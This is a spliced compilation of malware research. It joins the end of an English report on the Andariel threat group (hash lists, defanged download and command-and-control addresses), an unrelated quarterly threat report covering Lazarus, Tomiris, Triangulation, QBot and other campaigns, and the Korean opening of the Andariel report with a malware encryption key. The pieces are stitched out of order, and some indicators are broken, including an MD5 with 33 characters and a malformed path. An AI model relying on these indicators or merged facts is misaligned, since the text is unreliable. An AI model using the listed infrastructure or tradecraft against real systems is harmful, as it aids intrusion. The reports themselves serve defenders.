•	Malware strains developed in Go were used
•	Similarities between Andardoor and AndarLoader
•	Malware types similar to the Infostealer used in previous attacks were identified
First, there are the facts that the industries and sectors that became attack targets were the same as the targets identified in past attack cases and the same attack methods used in previous attacks were employed in recent cases. AhnLab identified cases where Innorix Agent was used. While not confirmed, many logs showed circumstances of spear phishing attacks.
The file name “iexplorer.exe” used to install malware has been identified from Andariel’s past attack cases to the present. Besides “iexplorer.exe”, names including the “svc” keyword such as “authsvc.exe” and “creditsvc.exe” has been continuously used. Also, aside from “mainsvc.exe” and “certsvc.exe”, there are cases where similar names such as “netsvc.exe” and “srvcredit.exe” were used.
As covered in the corresponding section, AndarLoader was obfuscated with the trial version of Dotfuscator, the tool used in Andardoor in previous attacks. It also uses SSL encryption to communicate with the C&C server, again showing similarities with past attack cases. Two other malware strains developed in Go were used as well. These align with the trend of malware strains developed in Go such as 1th Troy Reverse Shell and Black RAT continuously being used since the early part of this year.
Finally, there is also the system thought to be the threat actor’s test PC and Infostealer strains presumably created by the threat actor during the attack process. In fact, the Andariel group in the past installed malware strains responsible for stealing account credentials during the attack process, exfiltrating account credentials saved in Internet Explorer, Chrome, and Firefox web browsers. Such malware strains are command line tools that output the extracted account credentials via command lines. It seems that the threat actor used a backdoor to send the results to the C&C server.
 Figure 24. Infostealer identified in past attack cases
The Infostealer used in the recent attacks has a similar format. The only difference is that it only targets web browsers and steals account credentials and histories. Additionally, unlike the past cases where results were outputted by command lines, the recent version saves the stolen information in the same path under the file name “error.log”.
 Figure 25. Infostealer identified in recent attack cases
5. Conclusion
The Andariel group is one of the highly active threat groups targeting Korea along with Kimsuky and Lazarus. The group launched attacks to gain information related to national security in the early days but now carries out attacks for financial gains. [11] The group is known to employ spear phishing attacks, watering hole attacks, and vulnerability exploits for their initial infiltration process. There have also been cases where it used other vulnerabilities in the attack process to distribute malware strains.
Users must be particularly cautious about attachments to emails with unknown sources or executable files downloaded from websites. Users should also apply the latest patch for OS and programs such as internet browsers and update V3 to the latest version to prevent malware infection in advance.
File Detection
– Backdoor/Win.Agent.R562183 (2023.03.14.00)
– Backdoor/Win.Andardoor.C5381120 (2023.02.16.01)
– Backdoor/Win.Andardoor.R558252 (2023.02.16.01)
– Backdoor/Win.AndarGodoor.C5405584 (2023.04.05.03)
– Backdoor/Win.DurianBeacon.C5472659 (2023.08.18.02)
– Backdoor/Win.DurianBeacon.C5472662 (2023.08.18.02)
– Backdoor/Win.DurianBeacon.C5472665 (2023.08.18.03)
– Backdoor/Win.Goat.C5472627 (2023.08.18.02)
– Backdoor/Win.Goat.C5472628 (2023.08.18.02)
– Backdoor/Win.Goat.C5472629 (2023.08.18.02)
– Backdoor/Win.NukeSped.C5404471 (2023.04.03.02)
– Backdoor/Win.NukeSped.C5409470 (2023.04.12.00)
– Backdoor/Win.NukeSped.C5409543 (2023.04.12.00)
– Infostealer/Win.Agent.C5472631 (2023.08.18.02)
– Trojan/Win.Agent.C5393280 (2023.03.11.00)
– Trojan/Win.Agent.C5451550 (2023.07.11.00)
– Trojan/Win.Andarinodoor.C5382101 (2023.02.16.01)
– Trojan/Win.Andarinodoor.C5382103 (2023.02.16.01)
– Trojan/Win32.RL_Mimikatz.R366782 (2021.02.18.01)
Behavior Detection
– Suspicious/MDP.Download.M1004
– Infostealer/MDP.Behavior.M1965
IOC
MD5
– 0a09b7f2317b3d5f057180be6b6d0755: NukeSped variant – Volgmer (%SystemRoot%\mstc.exe.irx)
– 1ffccc23fef2964e9b1747098c19d956: NukeSped Variant – Volgmer (%SystemRoot%\msnox.exe.irx)
– 9112efb49cae021abebd3e9a564e6ca4: NukeSped variant – Volgmer (%SystemRoot%\system32\mscert.exe)
– bcac28919fa33704a01d7a9e5e3ddf3f: NukeSped variant – Volgmer (%SystemRoot%\msnoxe.exe.irx)
– ac0ada011f1544aa3a1cf27a26f2e288: Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– c892c60817e6399f939987bd2bf5dee0: Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– 0211a3160cc5871cbcd4e5514449162b: Andardoor (%SystemDrive%\users\%ASD%\msdes.exe.irx)
– e5410abaaac69c88db84ab3d0e9485ac: 1st Troy Reverse Shell (%SystemRoot%\msnox.exe.irx)
– 88a7c84ac7f7ed310b5ee791ec8bd6c5: 1st Troy Reverse Shell (%SystemRoot%\msnox.exe.irx)
– eb35b75369805e7a6371577b1d2c4531: TigerRat (%SystemRoot%\system32\hl_cl.exe)
– 5a3f3f75048b9cec177838fb8b40b945: TigerRat (%SystemDrive%\users\%ASD%\larabar.exe, %SystemDrive%\users\%ASD%\mainsvc.exe, %SystemDrive%\users\%ASD%\certsvc.exe)
– 9d7bd0caed10cc002670faff7ca130f5: Black RAT (%SystemRoot%\syswow64\mbcbuilder.exe, %SystemRoot%\syswow64\msinfo.exe)
– 8434cdd34425916be234b19f933ad7ea: Black RAT (%SystemRoot%\system32\shamon.exe)
– bbaee4fe73ccff1097d635422fdc0483: NukeSped Variant (%SystemDrive%\users\%ASD%\update.exe)
– 79e474e056b4798e0a3e7c60dd67fd28: NukeSped variant (%SystemRoot%\hl_cl.exe)
– 3ec3c9e9a1ad0e6a6bd75d00d616936bc: Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 95c276215dcc1bd7606c0cb2be06bf70: Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 426bb55531e8e3055c942a1a035e46b9: Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– cfae52529468034dbbb40c9a985fa504: Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– deae4be61c90ad6d499f5bdac5dad242: Goat RAT (%SystemDrive%\users\%ASD%\downloads\iexplore.exe)
– 6ab4eb4c23c9e419fbba85884ea141f4: AndarLoader ((SystemDrive%\users\%ASD%\pictures\runtime broker.exe, %SystemRoot%\system32\authsvc.exe, %SystemRoot%\system32\creditsvc.exe, %ProgramFiles%\smartplant\svchost.exe)
– bda0686d02a8b7685adf937cbcd35f46: DurianBeacon Go (a.exe)
– 6de6c27ca8f4e00f0b3e8ff5185a59d1: DurianBeacon Go (%SystemDrive%\users\%ASD%\pictures\xxx.exe)
– c61a8c4f6f6870c7ca0013e084b893d2: DurianBeacon Rust (%SystemDrive%\users\%ASD%\documents\d.exe)
– 5291aed100cc48415636c4875592f70c: Mimikatz (%SystemDrive%\users\%ASD%\mimi.exe)
– f4795f7aec4389c8323f7f40b50ae46f: malware collecting account credentials (%SystemDrive%\users\%ASD%\documents\mshelp.exe)
Download URLs
– hxxp://27.102.113[.]88/client.exe: NukeSped variant – Volgmer
– hxxp://27.102.107[.]230/mstcs.exe: NukeSped variant – Volgmer
– hxxp://27.102.107[.]233/update.exe: NukeSped variant – Volgmer
– hxxp://27.102.107[.]233/client.exe: NukeSped variant – Volgmer
– hxxp://27.102.107[.]234/update.exe: NukeSped variant – Volgmer
– hxxp://27.102.107[.]235/mstcs.exe: NukeSped variant – Volgmer
– hxxp://139.177.190[.]243/update.exe: Andardoor
– hxxp://4.246.144[.]112/update.exe: Andardoor
– hxxp://27.102.113[.]88/update.exe: 1st Troy Reverse Shell
– hxxp://27.102.107[.]224/update.exe: 1st Troy Reverse Shell
– hxxp://27.102.107[.]230/update.exe: 1st Troy Reverse Shell
– hxxp://www.ipservice.kro[.]kr/dataSeq.exe: AndarLoader
– hxxp://www.ipservice.kro[.]kr/creditsvc.exe: AndarLoader
C&C URLs
– 27.102.113[.]88:5443: NukeSped variant – Volgmer
– 27.102.107[.]234:8443: NukeSped variant – Volgmer
– 27.102.107[.]224:5443: NukeSped variant – Volgmer
– 109.248.150[.]179:443: NukeSped variant – Volgmer
– 139.177.190[.]243:443: Andardoor
– 4.246.144[.]112:443: Andardoor
– 27.102.113[.]88:21: 1st Troy Reverse Shell
– 27.102.107[.]224:8443: 1st Troy Reverse Shell
– 4.246.149[.]227:8080: TigerRat
– 13.76.133[.]68:8080: TigerRat
– 217.195.153[.]233:443: TigerRat
– bbs.topigsnorsvin.com[.]ec:8080: Black RAT
– 27.102.129[.]196:8088: Black RAT
– 13.76.133[.]68:10443: NukeSped variant
– 46.183.223[.]21:8080: Goat RAT
– chinesekungfu[.]org:443: AndarLoader
– privatemake.bounceme[.]net:443: AndarLoader
– 8.213.128[.]76:1012: DurianBeacon Go
 
IT threat evolution in Q2 2023
MALWARE REPORTS
30 AUG 2023
 15 minute read
 
AUTHORS
•	 DAVID EMM
•	IT threat evolution in Q2 2023
•	IT threat evolution in Q2 2023. Non-mobile statistics
•	IT threat evolution in Q2 2023. Mobile statistics
Targeted attacks
Gopuram backdoor deployed through 3CX supply-chain attack
Earlier this year, a Trojanized version of the 3CXDesktopApp, a popular VoIP program, was used in a high-supply-chain attack. The attackers were able to embed malicious code into the libffmpeg media processing library to download a payload from their servers.
When we reviewed our telemetry on the campaign, we found a DLL on one of the computers, named guard64.dll, which was loaded into the infected 3CXDesktopApp.exe process. A DLL with this name was used in recent deployments of a backdoor that we dubbed Gopuram, which we had been tracking since 2020. While investigating an infection of a cryptocurrency company in Southeast Asia, we found Gopuram coexisting on target computers with AppleJeus, a backdoor attributed to the Lazarus.
We had observed few victims compromised using Gopuram, but the number of infections increased in March 2023 — a spike that was directly related to the 3CX supply chain attack. The threat actor specifically targeted cryptocurrency companies. The backdoor implements commands that allow the attackers to interact with the victim’s file system and create processes on the infected machine. Gopuram was additionally observed to launch in-memory modules.
The fact that Gopuram backdoor has been deployed to less than 10 infected computers indicates that the attackers used Gopuram with surgical precision. We observed that they have a specific interest in cryptocurrency companies. We also learned that the threat actor behind Gopuram infects target machines with the full-fledged modular Gopuram backdoor. We believe that Gopuram is the main implant and the final payload in the attack chain.
The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence.
Tracking the Lazarus DeathNote campaign
Lazarus is a notorious and highly skilled threat actor. Over the last few years we have tracked DeathNote, one of Lazarus’s active clusters, observing a shift in the threat actor’s targets as well as the development and refinement of its TTPs (Tactics, Techniques, and Procedures).
 
Since 2018, Lazarus has persistently targeted crypto-currency-related businesses for a long time, using malicious Word documents and themes related to the crypto-currency business to lure potential targets. If the target opened the document and enabled the macros, a malicious script would extract the embedded downloader and load it with specific parameters. Lazarus used two different kinds of second-stage payload in these attacks: the first, a Trojanized application masquerading as the UltraVNC viewer, the second, a typical multi-stage backdoor.
 
Our investigations identified compromised individuals or companies in Cyprus, the US, Taiwan, and Hong Kong.
In April 2020, we uncovered a significant shift in targeting and infection vector. The DeathNote cluster was used to target the automotive and academic sectors in Eastern Europe, both of which are connected to the defense industry. At this point, the threat actor switched all the decoy documents to job descriptions related to defense contractors and diplomatic services.
Lazarus also refined its infection chain using the remote template injection technique in its weaponized documents, as well as utilizing Trojanized open-source PDF viewer software. Both infection methods resulted in the same malware (the DeathNote downloader), which uploaded the target’s information and retrieved the next-stage payload at the discretion of the C2 (Command and Control) server. Finally, a COPPERHEDGE variant was executed in memory.
 
In May 2021, the DeathNote cluster was used to compromise a European IT company providing solutions for monitoring network devices and servers, possibly because Lazarus had an interest in this company’s widely-used software or its supply-chain.
In early June 2021, the Lazarus group began utilizing a new infection mechanism against targets in South Korea. One thing that caught our attention was that the initial stage of the malware was executed by a legitimate security software that is widely used in the country. It’s thought that the malware was spread through a vulnerability in the software.
As in the previous case, the initial infection vector created the downloader malware. Once connected to the C2 server, the downloader retrieved an additional payload based on the operator’s commands and executed it in memory. During this time, the BLINDINGCAN malware was used as a memory-resident backdoor. While the BLINDINGCAN malware has sufficient capabilities to control the victim, the actor manually implanted additional malware: it’s thought that the group aimed to create an auxiliary method to control the victim. Finally, the COPPERHEDGE malware, previously used by this cluster, was executed on the victim.
 
A year later, in March 2022, we discovered that the same security program had been exploited to propagate similar downloader malware to several victims in South Korea. However, a different payload was delivered in this case. The C2 operator manually implanted a backdoor twice, and although we were unable to acquire the initially implanted backdoor, we assume it is the same as the backdoor in the following stage. The newly implanted backdoor is capable of executing a retrieved payload with named-pipe communication. In addition, the actor utilized side-loading to execute Mimikatz and used stealer malware to collect keystroke and clipboard data from users.
 
At around the same time, we uncovered evidence that one defense contractor in Latin America had been compromised by the same backdoor. The initial infection vector was similar to what we’ve seen with other defense industry targets, involving the use of a Trojanized PDF reader with a crafted PDF file. However, in this particular case, the actor adopted a side-loading technique to execute the final payload. When the malicious PDF file is opened with the Trojanized PDF reader, the victim is presented with the same malware mentioned above, which collects and reports the victim’s information, retrieves commands and executes them using pipe communication mechanisms. The threat actor used this malware to implant additional payloads, including legitimate files for side-loading purposes.
In July 2022, Lazarus successfully breached a defense contractor in Africa. The initial infection was a suspicious PDF application, which had been sent via the Skype messenger. After executing the PDF reader, it created both a legitimate file (CameraSettingsUIHost.exe) and a malicious file (DUI70.dll) in the same directory. This attack relied heavily on the same DLL side-loading technique that we observed in the previous case. Lazarus used this malware several times in various campaigns; and also used the same DLL side-loading technique to implant additional malware that is capable of backdoor operation. In order to move laterally across systems, the actor used an interesting technique called ServiceMove. This technique uses the Windows Perception Simulation Service to load arbitrary DLL files: by creating an arbitrary DLL in C:\Windows\System32\PerceptionSimulation\ and starting the service remotely, the threat actor was able to achieve code execution as NT AUTHORITY\SYSTEM on a remote system.
Our analysis of the DeathNote cluster reveals a rapid evolution in its TTPs over the years. As Lazarus continues to refine its approaches, it is crucial for organizations to maintain vigilance and take proactive measures to defend against its malicious activities. By staying informed and implementing strong security measures, organizations can reduce the risk of falling victim to this dangerous adversary.
Tomiris called, they want their Turla malware back
We first reported Tomiris in September 2021, following our investigation into a DNS hijack against a government organization in the CIS (Commonwealth of Independent States). We described links between a Tomiris Golang implant and SUNSHUTTLE (which has been linked to NOBELIUM/APT29/TheDukes) as well as Kazuar (which has been linked to Turla). However, interpreting these connections proved difficult. We have continued to track Tomiris as a separate threat actor over three new attack campaigns between 2021 and 2023, and our telemetry has allowed us to shed more light on this group.
This threat actor’s activities have been focused on CIS members and Afghanistan: while we identified a few targets in other locations, all of them appear to be foreign diplomatic entities of these countries.
 
Tomiris uses a wide variety of malware implants developed at a rapid pace and in all programming languages imaginable. The tools used by this threat actor fall into three categories: downloaders, backdoors, and file stealers. The threat actor not only develops its own tools, but also uses open source or commercially available implants and offensive tools. Tomiris employs a wide variety of attack vectors: spear-phishing, DNS hijacking, exploitation of vulnerabilities (specifically ProxyLogon), suspected drive-by downloads, and other “creative” methods.
 
The attribution of tools used in a cyber-attack can sometimes be a very tricky issue. In January, some fellow researchers attributed an attack on organizations in Ukraine to Turla, based, at least in part, on the use of KopiLuwak and QUIETCANARY (which we call TunnusSched) — malware known to have been used by Turla.
We discovered that a TunnusSched sample had been delivered to a government target in the CIS in September 2022; and our telemetry indicated that this malware had been deployed from Tomiris’s Telemiris malware. Moreover, starting in 2019, we discovered additional implant families linked to KopiLuwak; and that TunnusSched and KopiLuwak are part of the same toolset.
We remain convinced that, despite possible ties between the two groups, Turla and Tomiris are separate threat actors. Tomiris is undoubtedly Russian-speaking, but its targeting and tradecraft are significantly at odds with what we have observed for Turla. In addition, Tomiris’s general approach to intrusion and limited interest in stealth are significantly at odds with documented Turla tradecraft.
This throws up several possibilities.
1.	Turla is happy to use a tool that was burned in 2016; and is still using it in current operations along with new tools.
2.	Other threat actors may have repurposed these tools and are using them under a false flag.
3.	Turla shares tools and expertise with Tomiris, or cooperates with Tomiris on joint operations.
4.	Tomiris and Turla rely on a common supplier that provides offensive capabilities. Or maybe Tomiris initially started out as a private outfit writing tools for Turla and is now branching out into the mercenary business.
Our assessment is that the first two hypotheses are the least likely and that there exists a form of deliberate co-operation between Tomiris and Turla, although its exact nature is hard to determine with the information we have at hand.
CloudWizard APT: the bad magic story goes on
Last October, we identified an active infection of government, agriculture, and transportation organizations located in Donetsk, Lugansk, and Crimea. We published the results of our initial investigations into the PowerMagic and CommonMagic implants in March. At that time, we were unable to find anything to connect the samples we found and the data used in the campaign to any previously known threat actor. However, our continuing investigations revealed more information about this threat, including links to other APT campaigns.
While looking for implants bearing similarities to PowerMagic and CommonMagic, we identified a cluster of even more sophisticated malicious activities originating from the same threat actor. Interestingly, the targets were located not only in the Donetsk, Lugansk, and Crimea regions, but also in central and western Ukraine. These targets included individuals, as well as diplomatic and research organizations.
The newly discovered campaign involved use of a modular framework we dubbed CloudWizard. Its features include taking screenshots, microphone recording, keylogging, and more.
 
There have been many APT threat actors operating in the Russo-Ukrainian conflict region over the years, including Gamaredon, CloudAtlas, and BlackEnergy. So we looked for clues that might allow us to attribute CloudWizard to a known threat actor. CloudWizard reminded us of two campaigns observed in Ukraine and reported publicly: Operation Groundbait (first described by ESET in 2016) and Operation BugDrop (discovered by CyberX in 2017). While there have been no updates about Prikormka malware (part of Operation Groundbait) for a few years now, we discovered multiple similarities between the malware used in that campaign and CommonMagic and CloudWizard. It’s clear, therefore, that the threat actor behind these two operations has not ceased its activity and has continued developing its cyber-espionage toolset and infecting targets of interest for more than 15 years.
Meet the GoldenJackal APT group. Don’t expect any howls
GoldenJackal, an APT group that has been active since 2019, typically targets government and diplomatic entities in the Middle East and South Asia.
 
We started monitoring this threat actor in mid-2020 and have observed a constant level of activity that indicates a capable and stealthy actor.
The main feature of this group is a specific toolset of .NET malware: JackalControl, JackalWorm, JackalSteal, JackalPerInfo, and JackalScreenWatcher. These implants are intended to control target computers, spread using removable drives, exfiltrate data, steal credentials, collect information about the local system and the target’s web activities, and take screen captures.
While we have limited visibility into this threat actor’s infection vectors, during our investigations, we observed the use of fake Skype installers and malicious Word documents.
The fake Skype installer was a .NET executable file named skype32.exe — a dropper containing two resources: the JackalControl Trojan and a legitimate Skype for Business standalone installer. The malicious document, which masquerades as a legitimate circular distributed to collect information about officers decorated by the Pakistan government, uses the remote template injection technique to download a malicious HTML page, which exploits the Follina vulnerability.
 
GoldenJackal activity is characterized by the use of compromised WordPress websites as a method to host C2-related logic. We believe the attackers upload a malicious PHP file that is used as a relay to forward web requests to another backbone C2 server. We don’t have any evidence of the vulnerabilities used to compromise the sites. However, we did observe that many of the websites were using obsolete versions of WordPress and some had also been defaced or infected with previously uploaded web shells, probably as a result of low-key hacktivist or cybercriminal activity.
Operation Triangulation
Early in June, we issued an early warning of a long-standing campaign that we track under the name Operation Triangulation, involving a previously unknown iOS malware platform distributed via zero-click iMessage exploits.
The attack is carried out using an invisible iMessage with a malicious attachment. Using a number of vulnerabilities in iOS, the attachment is executed and installs spyware. The deployment of the spyware is completely hidden and requires no action from the person being targeted. The spyware then quietly transmits private information to remote servers — including microphone recordings, photos from instant messengers, geo-location, and data about a number of other activities of the owner of the infected device.
We detected this threat using the Kaspersky Unified Monitoring and Analysis Platform (KUMA) — a native SIEM solution for security information and event management. Further investigation revealed that several dozen iPhones of Kaspersky employees were infected.
In addition to reaching out to industry partners to assess the prevalence of this threat, we provided a forensic methodology to help readers determine whether their organization is targeted by the unknown group behind these attacks. We subsequently published a utility to check for Indicators of Compromise (IoCs).
Following this, we released the first of a series of additional reports describing the final payload in the infection chain: a highly sophisticated spyware implant that we dubbed “TriangleDB”. Operating in memory, this implant periodically communicates with the C2 infrastructure to receive commands. The implant allows attackers to browse and modify device files, get passwords and credentials stored in the keychain, retrieve geo-location information, as well as execute additional modules, further extending their control over the compromised devices.
Andariel’s mistakes and a new malware family
Andariel, part of the Lazarus group, is known for its use of the DTrack malware and Maui ransomware in mid-2022. During the same period, Andariel also actively exploited the Log4j vulnerability. The campaign introduced several new malware families, such as YamaBot and MagicRat, but also updated versions of NukeSped and DTrack.
While on an unrelated investigation, we stumbled upon a new campaign and decided to dig a little bit deeper. We discovered a previously undocumented malware family and an addition to Andariel’s set of TTPs.
Andariel infects machines by executing a Log4j exploit, which, in turn, downloads further malware from the C2 server. Unfortunately, we were unable to catch the first piece of malware they downloaded, but we did see that exploitation was closely followed by the download of the DTrack backdoor.
We were able to reproduce the commands the attackers executed and it quickly became clear that the commands were run by a human operator — and, judging by the number of mistakes and typos, probably an inexperienced one. We were also able to identify the set of off-the-shelf tools Andariel installed and ran during the command execution phase, and then used for further exploitation of the target. These include Supremo remote desktop, 3Proxy, Powerline, Putty, Dumpert, NTDSDumpEx, and ForkDump.
We also uncovered new malware, called EarlyRat. We had first noticed this in one of the aforementioned Log4j cases and assumed it was downloaded via Log4j. However, when we started hunting for more samples, we found phishing documents that ultimately dropped EarlyRat.
 
EarlyRat, like the phishing document, is very simple: it is capable of executing commands, but nothing else of interest.
Other malware
Nokoyawa ransomware attacks using Windows zero-day
Our Behavioral Detection Engine and Exploit Prevention components detected attempts to execute elevation-of-privilege exploits on Windows servers belonging to SMBs in the Middle East, North America, and Asia. They were similar to exploits in the Common Log File System (CLFS) — the Windows logging subsystem — that we had analyzed previously. However, when we double-checked, one of them turned out to be a zero-day supporting different versions and builds of Windows, including Windows 11. We shared our findings with Microsoft, which designated the vulnerability as CVE-2023-28252. The vulnerability was patched on April 4.
Most zero-days that we have discovered in the past were used by APT threat actors, but this one was used by Nokoyawa, a sophisticated cybercrime group, to carry out ransomware attacks.
A spike in QBot banking Trojan infections
In early April, we detected a significant increase in attacks using the QBot malware (aka QakBot, QuackBot, and Pinkslipbot). The malware was delivered through malicious documents attached to business correspondence. The hackers would obtain access to real business correspondence (QBot, among other things, steals locally stored e-mails from previous targets’ computers) and join the dialogue, sending messages as if they’re carrying on an old conversation. The e-mails attempt to convince targets to open an attached PDF file, passing it off as an expenses list or other business matter. The PDF actually contains a fake notification from Microsoft Office 365 or Microsoft Azure. The attackers use this to try to get the target to click on the “Open” button, which then downloads a password-protected archive with the password in the text of the notification. If the recipient unpacks the archive and runs the .WSF (Windows Script File) inside, it downloads the QBot malware from a remote server.
 
Minas: on the way to complexity
In June 2022, we found a suspicious shellcode running in the memory of a system process. From our reconstruction of the infection chain, we determined that it originated by running an encoded PowerShell script as a task, which we believe with low confidence was created through a GPO (Group Policy Object) — something that’s especially worrying, since it indicates that the attackers had compromised the target network.
 
The malware, which we call Minas, is a miner. It aims to hide its presence on infected systems through encryption, the random generation of names, and the use of hijacking and injection techniques. It also has the ability to stay on the infected system using persistence techniques.
We think it’s very likely that a new variant will be released in the future that seeks to avoid anti-virus detection — which is why it’s essential to use a security solution that doesn’t primarily rely on signature detection, but also uses behavioral detection methods.
Satacom delivers browser extension that steals crypto-currency
In June, we reported a recent malware distribution campaign related to the Satacom downloader. The main purpose of the dropped malware is to steal bitcoins from the target’s account by performing web injections into targeted crypto-currency websites. The malware attempts to do this by installing an extension for Chromium-based web browsers, which later communicates with its C2 server, whose address is stored in the BTC transaction data.
The malicious extension has various JS scripts to perform browser manipulations while the user is browsing the targeted websites, including enumeration and manipulation with crypto-currency websites. It also has the ability to manipulate the appearance of some e-mail services, such as Gmail, Hotmail, and Yahoo, in order to hide its activity.
While we analyzed a Windows-specific infection-chain, the malware operates as a browser extension, so it could be installed in Chromium-based browsers on various platforms — allowing the attackers to target Linux and macOS if they choose to do so.
DoubleFinger used to steal crypto-currency
In June, we reported the use of a sophisticated attack using the DoubleFinger loader to install a crypto-stealer and remote access Trojan. The technical nature of the attack, and its multi-stage infection mechanism, resemble attacks by APT threat actors.
The process starts with an e-mail containing a malicious PIF file. If the target opens the attachment, the first stage of the attack begins. DoubleFinger executes a shellcode that downloads a file in PNG format from the image-sharing platform Imgur.com. This file actually contains multiple DoubleFinger components in encrypted form, which are used in subsequent stages of the attack. These include a loader for use in the second stage of the attack — a legitimate java.exe file; actions to try to bypass security software installed on the computer; and decryption of another PNG file deployed at the fourth stage — this PNG file contains not only the malicious code but also the image that gives the malware its name.
 
DoubleFinger then launches the fifth stage using a technique called Process Doppelgänging, whereby it replaces the legitimate process with a modified one that contains the malicious payload — the GreetingGhoul crypto-stealer, which installs itself in the system and is scheduled to run daily at a certain time.
GreetingGhoul contains two components: one detects crypto-wallet applications in the system and steals data of interest to the attackers (such as private keys and seed phrases); and another that overlays the interface of crypto-currency applications and intercepts user input.
These enable the attackers to take control of the target’s crypto-wallets and withdraw funds from them.
 
 
We found several DoubleFinger modifications, some of which install the remote access Trojan Remcos. Its purpose is to observe all user actions and seize full control of the system.
 
Andariel 그룹의 새로운 공격 활동 분석
목차
1. 과거 공격 사례
…. 1.1. Innorix Agent 악용 사례
…….. 1.1.1. NukeSped 변종 – Volgmer
…….. 1.1.2. Andardoor
…….. 1.1.3. 1th Troy Reverse Shell
…. 1.2. 국내 기업 공격 사례
…….. 1.2.1. TigerRat
…….. 1.2.2. Black RAT
…….. 1.2.3. NukeSped 변종
2. 최근 공격 사례
…. 2.1. Innorix Agent 악용 사례
…….. 2.1.1. Goat RAT
…. 2.2. 국내 기업 공격 사례
…….. 2.2.1. AndarLoader
…….. 2.2.2. DurianBeacon
3. 최근 공격 사례들의 연관성
4. Andariel 그룹의 과거 공격 사례들과의 연관성
5. 결론
주로 국내 기업 및 기관들을 공격 대상으로 하는 Andariel 위협 그룹은 Lazarus 위협 그룹과 협력하는 관계이거나 혹은 Lazarus 그룹의 하위 조직으로 알려져 있다. 2008년부터 국내 대상 공격이 최초로 확인되었으며 주요 공격 대상으로는 국방, 정치기구, 조선, 에너지, 통신 등 안보와 관련된 곳이다. 물론 이외에도 대학교나 운송, ICT 업체 등 국내에 위치한 다양한 기업 및 기관들이 공격 대상이 되고 있다. [1]
Andariel 위협 그룹은 최초 침투 과정에서 주로 스피어 피싱 공격이나 워터링 홀 공격 그리고 공급망 공격을 이용하며, 이외에도 악성코드 설치 과정에서 중앙관리 솔루션을 악용하는 사례도 존재한다. [2] Andariel 그룹의 특징 중 하나라면 다양한 악성코드를 제작해 공격에 사용하는 점인데 특히 과거 공격에 사용된 Andarat, Andaratm, Phandoor, Rifdoor 외에도 수년 전부터 확인되고 있는 TigerRAT [3], MagicRAT [4] 등 백도어 유형이 많다.
ASEC(AhnLab Security Emergengy response Center)에서는 Andariel 위협 그룹의 공격을 지속적으로 모니터링하고 있으며, 최근 Andariel 그룹의 공격으로 추정되는 공격 사례들이 확인되어 관련 내용들을 블로그에 공개한다. 참고로 해당 공격 사례들에서는 이전 공격에서 확인된 악성코드들이나 C&C 서버가 사용되지 않았기 때문에 직접적인 연관 관계는 존재하지 않는다. 이에 따라 해당 공격들과 Andariel 위협 그룹의 연관성을 확인하기 위해 먼저 2023년 상반기 Andariel 그룹의 공격 사례들을 분석한 후 이를 기반으로 연관 관계를 정리하며, 필요할 경우 이보다 이전 공격 사례에서 확인된 내용들도 포함한다.
2023년에 확인된 공격들의 특징으로는 Go 언어로 개발된 악성코드들이 다수 확인된다는 점이다. 과거 Innorix Agent를 악용한 공격 사례에서는 Go 언어로 개발된 Reverse Shell이 사용되었으며, 이후 국내 기업들을 대상으로 한 공격에서는 Black RAT이 사용되었다. 이러한 경향은 최근 공격 사례까지 이어져 Goat RAT, DurianBeacon 등 Go 언어로 개발된 또 다른 악성코드들이 공격에 사용되고 있다. 참고로 DurianBeacon은 Go 버전 외에도 Rust 언어로 개발된 버전이 함께 존재하는 것이 특징이다.
 Figure 1. Go 언어로 개발된 DurianBeacon의 소스 코드 정보
최초 유포 사례가 직접적으로 확인되지 않기 때문에 본 포스팅에서는 공격에 사용된 악성코드들을 기반으로 분석을 진행한다. 참고로 다양한 악성코드들이 공격에 사용되는데, 악성코드 제작자가 지정한 이름이 확인될 경우에는 해당 이름을 사용하며 그렇지 않을 경우에는 유사 악성코드나 자사의 진단명을 명시하는 방식으로 정리한다.

1. 과거 공격 사례
1.1. Innorix Agent 악용 사례
2023년 2월 ASEC에서는 “취약한 Innorix 악용한 악성코드 유포 : Andariel” 블로그를 통해 Andariel 위협 그룹이 취약한 버전의 Innorix Agent 사용자를 대상으로 악성코드를 유포한 정황을 공개하였다. [5] 유포에 악용된 Innorix Agent 프로그램은 파일 전송 솔루션 클라이언트 프로그램으로, 한국인터넷진흥원(KISA)에서 취약점 관련 내용을 게시하고 보안 업데이트가 권고된 INNORIX Agent 9.2.18.450 및 이전 버전들로 확인되었다. [6]
 Figure 2. 과거 취약한 Innorix Agent를 이용한 악성코드 유포 정황
위의 공격 사례를 통해 공격에 사용된 악성코드들을 조사한 결과 다수의 국내 대학교에서 악성코드들이 감염되었던 것을 확인하였다. 공격에 사용된 악성코드들은 대부분 백도어 유형이며 모두 이전에 알려진 유형은 존재하지 않는다. 하지만 과거 사용되었던 다른 악성코드나 이후 공격에 사용된 악성코드들과의 연관성이 존재하기 때문에 여기에서는 간략하게 특징을 정리한다.

1.1.1. NUKESPED 변종 – VOLGMER
과거 블로그에서도 언급했다시피 해당 악성코드는 C&C 서버와의 통신 과정에서 패킷을 암호화하기 위해 다음과 같은 0x10 바이트 키를 사용했다. 해당 키 값은 미국의 사이버인프라보안청(CISA) 보고서에서 Hidden Cobra (Lazarus) 위협 그룹의 Volgmer 악성코드에서 사용한 키 값과 동일하다. [7] (현재 접속 불가)
•	Key : 74 61 51 04 77 32 54 45 89 95 12 52 12 02 32 73
Volgmer는 상대적으로 최근까지도 공격에 사용되고 있으며 레지스트리 “HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security” 키에 저장된 설정 데이터를 읽어 동작하고 C&C 서버와의 통신에 HTTP 프로토콜을 사용한다. 이러한 점은 과거 CISA 보고서에서 언급한 유형과 거의 유사한데, 이는 Volgmer는 별다른 변형 없이 지속적으로 공격에 사용되고 있다는 것을 의미한다. 또한 해당 악성코드에서 Volgmer와 동일한 키 값이 사용되었지만 이 악성코드가 C&C 서버와의 통신 패킷을 암호화하는데 해당 키 값을 사용하는 것과 달리 Volgmer는 레지스트리에 암호화되어 저장된 설정 데이터를 복호화하는데 사용하였다는 차이점이 존재한다.
